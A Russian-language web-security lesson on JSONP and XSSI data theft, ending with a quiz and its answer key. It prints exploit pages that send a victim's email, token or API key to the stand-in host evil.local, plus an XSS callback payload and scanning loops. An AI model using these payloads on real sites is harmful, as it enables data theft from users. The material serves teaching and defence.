---
id: web-jsonp-xssi
title: "JSONP и XSSI (JSON hijacking)"
category: web
parent: web-browser-core
difficulty: medium
order: 2
tags: [jsonp, xssi, json-hijacking, cors, cross-origin, legacy]
prerequisites: [web-same-origin-cors, web-browser-security]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 40
summary: "Почему JSONP опасен, как работает XSSI и как через теги читать данные, которые SOP вроде бы защищает."
---

## Вопрос, с которого всё начинается

В прошлом уроке мы выяснили: SOP запрещает скрипту читать данные чужого origin. Значит, чтобы украсть данные жертвы с `api.victim.com`, нужно её согласие или ошибка CORS.

Но есть путь **без** CORS и без ошибок конфигурации — через **теги**. Браузер разрешает `<script src="...">` обращаться к любому origin. Если сервер отдаёт данные в формате, который исполняется как JavaScript, — данные попадут в наш код. Сегодня разберём два родственных класса: **JSONP** и **XSSI**.

## Наш пример: эндпоинт с callback

Возьмём магазин `shop.local`. Заметим, что его API умеет оборачивать ответ в вызов функции, имя которой задаёт клиент:

```bash
$ curl -s 'https://shop.local/api/me?callback=cb'
cb({"email":"guest@shop.local"})
```

Параметр `callback` — это и есть **JSONP** (JSON with Padding): сервер «оборачивает» JSON в вызов функции. Так делали до появления CORS, чтобы отдавать данные между origin.

## Шаг 1: как JSONP обходит SOP

Ключ в механизме тегов. `<script>` может загружаться с чужого origin — SOP это **не запрещает**, он запрещает только **чтение ответа**. Но если ответ — это JavaScript, он исполняется, а значит, его содержимое «приходит» в наш контекст как вызов функции.

Значит, достаточно определить у себя функцию `cb` и подключить JSONP-ответ как скрипт — данные окажутся у нас. Проблема в том, что **любой сайт** может указать свой `callback`.

## Шаг 2: кража данных через JSONP

Проверим, отдаёт ли эндпоинт данные с сессионной cookie (а не только с токеном в заголовке):

```bash
$ curl -s 'https://shop.local/api/me?callback=cb' | head -c 60
cb({"error":"unauthorized"})
$ curl -s 'https://shop.local/api/me?callback=cb' -b 'session=abc'
cb({"email":"victim@shop.local","token":"eyJ..."})
```

Без cookie — `unauthorized`, с cookie — данные. Значит, JSONP сработает с сессией жертвы. Собираем страницу-эксплойт:

```html
<script>
function cb(d){ fetch('https://evil.local/collect',{method:'POST',body:JSON.stringify(d)}); }
</script>
<script src="https://shop.local/api/me?callback=cb"></script>
```

Жертва открывает страницу — её email и токен уходят на `evil.local`. Артефакт — данные жертвы на нашем сервере. Обрати внимание: cookie ушли автоматически, потому что `<script>` — это запрос от имени жертвы.

## Шаг 3: JSONP → XSS

Если имя callback **не валидируется**, оно попадает в ответ как код — и это уже XSS:

```bash
$ curl -s 'https://shop.local/api/me?callback=alert(document.domain)//'
alert(document.domain)//({"email":"..."})
```

Символы `//` в конце «съедают» остаток строки, и в браузере исполняется `alert(document.domain)`. Обходы фильтров имени callback: точки и скобки (`foo.bar`, `foo[bar]`), `window.name`, `eval`, разделители `;`. Классический JSONP-эндпоинт часто уязвим **и** к краже данных, **и** к XSS одновременно.

## Шаг 4: XSSI через JS-конфиг

**XSSI** (Cross-Site Script Inclusion) — более широкий класс: любое включение чужого скрипта, позволяющее прочитать данные. Это не только JSONP. Например, конфиг-файл, случайно попавший в прод:

```bash
$ curl -s https://shop.local/static/config.js
window.__CONFIG__ = {"apiKey":"AIza...","admin":true};
```

Подключаем его как скрипт и читаем переменную:

```html
<script src="https://shop.local/static/config.js"></script>
<script>fetch('https://evil.local/?k='+window.__CONFIG__.apiKey);</script>
```

Данные утекают, хотя это не JSONP и не CORS-мисконфиг. Любой JS-файл с секретами, который можно включить как скрипт, — потенциальная утечка.

## Шаг 5: защита и её обход

Правильная защита многослойна: отказ от JSONP в пользу CORS, строгая валидация имени callback (`^[a-zA-Z_$][a-zA-Z0-9_$]*$`), правильный `Content-Type: application/json`, `X-Content-Type-Options: nosniff`, префикс `)]}',\n` и cookie с `SameSite=Lax/Strict`.

Ломается она так: «чёрный список» символов обходится через допустимые, но опасные конструкции; `nosniff` бесполезен, если Content-Type всё равно `text/javascript`; префикс обходится, если сервер позволяет задать имя переменной; проверка `Referer` — через открытый редирект.

```bash
$ curl -sI 'https://shop.local/api/me?callback=cb' | grep -iE 'content-type|x-content-type'
content-type: text/javascript
```

`text/javascript` — значит, ответ включаем как скрипт, и XSSI возможен.

## Если не сработало

- Cookie `SameSite=Lax/Strict` не отправляются при включении скрипта — атака может не сработать. Проверь атрибут `SameSite` у сессионной cookie.
- `nosniff` + `application/json` закрывают MIME-сниффинг — ищи другой эндпоинт, отдающий `text/javascript`.
- Префикс `)]}',` «ломает» исполнение — попробуй съесть его, если сервер позволяет задать имя переменной.
- `HttpOnly` не защищает от XSSI: данные утекают через чтение переменных, а не `document.cookie`.
- JSONP закрыт — переходи к CORS-мисконфигу или XS-Leaks: все три класса решают одну задачу — прочитать данные чужого origin.

## Массовый поиск JSONP и XSSI

Ручной поиск медленный, поэтому на большом scope применяют автоматизацию. Первый источник — краулинг с исполнением JS: `katana` собирает URL, среди которых легко грепнуть callback-параметры. Второй — JS-бандлы, где имена параметров захардкожены. Третий — исторические URL (`gau`, `waybackurls`), где остаются забытые JSONP-эндпоинты.

```bash
$ katana -u https://shop.local -jc -silent | grep -iE 'callback|jsonp|cb=' | sort -u > jsonp.txt
$ gau shop.local | grep -iE 'callback|jsonp|cb=' >> jsonp.txt
$ sort -u jsonp.txt -o jsonp.txt
```

Дальше для каждого URL проверяем, отражается ли произвольный callback:

```bash
$ while read u; do
>   base="${u%%\?*}"; r=$(curl -s "${base}?callback=JSONP_TEST")
>   echo "$r" | grep -q 'JSONP_TEST' && echo "VULN: $base"
> done < jsonp.txt
```

Отдельно ищите XSSI: любые `.js` с данными. Часто это конфиги `config.js`, `settings.js`, `env.js`, случайно попавшие в прод. Их достаточно подключить как скрипт и прочитать переменные.

## Что мы теперь знаем

- JSONP обходит SOP через `<script>`, который не подчиняется запрету на чтение.
- Любой сайт может указать свой `callback` и прочитать данные с сессией жертвы.
- Невалидированный `callback` даёт XSS (`callback=alert(1)//`).
- XSSI — шире JSONP: любой чужой JS с данными, включаемый как скрипт.
- Защита: CORS вместо JSONP, строгая валидация callback, `nosniff`, префикс, `SameSite`.
- `SameSite` может «погасить» атаку — интерпретируй это правильно, а не как защиту сервера.

## На что смотреть дальше

- Не считай JSONP безобидным legacy — это полноценный обход SOP.
- Ищи callback-параметры не только в крауле, но и в JS-бандлах и исторических URL (`gau`).
- Не забывай про XSSI за пределами JSONP: конфиги `config.js`, `settings.js`, `env.js`.
- Проверяй `Content-Type` ответа — включаемо он как скрипт или нет.
- Помни, что `SameSite` — не панацея: `Lax` всё ещё шлёт cookie при top-level навигации.
- Сравнивай с соседними классами: если JSONP закрыт, но CORS отражает origin — используй CORS; если и он закрыт, но есть различимое поведение — это XS-Leaks.
- Все три класса (JSONP, CORS, XS-Leaks) решают одну задачу — прочитать данные или узнать состояние чужого origin из браузера жертвы; проверяй их вместе, а не по отдельности.

## Квиз

Проверь себя.

```quiz
- question: "Почему JSONP обходит SOP?"
  options:
    - "`<script>` исполняет кросс-ориджин JS, а SOP не мешает загрузке скриптов"
    - "Он шифрует данные"
    - "Он использует HTTPS"
    - "Он меняет cookie"
  answer: 0
  explanation: "Скрипт-теги не подчиняются SOP на чтение, поэтому JSONP-ответ исполняется."
- question: "Что такое XSSI?"
  options:
    - "Чтение данных через включение чужого JS/данных как скрипта"
    - "SQL-инъекция"
    - "Отравление DNS"
    - "CSRF"
  answer: 0
  explanation: "Cross-Site Script Inclusion — класс утечки через скрипт-теги."
- question: "Какой префикс используют против XSSI?"
  options:
    - "`while(1);`"
    - "`<!--`"
    - "`<?xml`"
    - "`%PDF`"
  answer: 0
  explanation: "`while(1);` в начале ответа «вешает» исполнение как скрипта."
- question: "Какой заголовок мешает исполнить JSON как JS?"
  options:
    - "`X-Content-Type-Options: nosniff`"
    - "`Server`"
    - "`Referer`"
    - "`Age`"
  answer: 0
  explanation: "`nosniff` + правильный `Content-Type` закрывают MIME-сниффинг."
- question: "Что влияет на то, утекут ли данные через JSONP?"
  options:
    - "Политика cookie (`SameSite`, `HttpOnly`)"
    - "Порт сервера"
    - "HTTP-метод"
    - "User-Agent"
  answer: 0
  explanation: "Если cookie не уходят, JSONP может отдать анонимные данные, но не приватные."
```

## Куда дальше

В следующем уроке мы разберём **CORS глубоко** (`web-cors-deep`): как конфигурация `Access-Control-Allow-Origin` открывает чтение данных, и какие ошибки в ней встречаются чаще всего. А пока главное запомни: JSONP и XSSI — это каналы чтения чужого origin через теги, и если такой канал открыт, данные утекут независимо от состояния CORS.

## Где пригодится

- **CTF (Web):** задачи на SOP-обход и JSON-hijacking.
- **Bug bounty:** живые JSONP-эндпоинты — утечка данных, часто недооценённая.
- **Пентест:** аудит API на callback-параметры и XSSI-защиту.
- **Работа (AppSec/Dev):** отказ от JSONP в пользу CORS, `nosniff`, префиксы.
